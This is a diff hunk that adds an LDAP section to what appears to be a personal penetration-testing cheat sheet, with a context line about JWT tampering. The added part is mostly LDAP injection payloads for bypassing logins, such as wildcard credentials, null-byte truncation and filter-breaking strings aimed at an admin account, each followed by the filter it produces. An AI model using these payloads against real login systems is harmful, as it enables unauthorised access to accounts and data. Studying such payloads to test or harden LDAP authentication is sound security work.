@@ -47,4 +47,25 @@ jwt editor keys插件
 4、修改sub,点击 sign 签名
 
 
-
+# LDAP
+payload:")(cn=))(|(objectClass=*"
+"(&(cn=))(|(uid=))(|(objectClass=*))(userpassword=[password])"
+login bypass
+user=*
+password=*
+--->(&(user=*)(password=*))
+user=*)(&
+password=*)(&
+-->(&(user=*)(&)(password=*)(&))
+user=*)(|(password=*
+password=test)
+--> (&(user=*)(|(password=*)(password=test))
+user=*))%00
+pass=any
+--> (&(user=*))%00 --> Nothing more is executed
+username = admin)(!(&(|
+pass = any))
+--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
+username=admin))(|(|
+password=any
+--> (&(uid=admin)) (| (|) (webpassword=any))
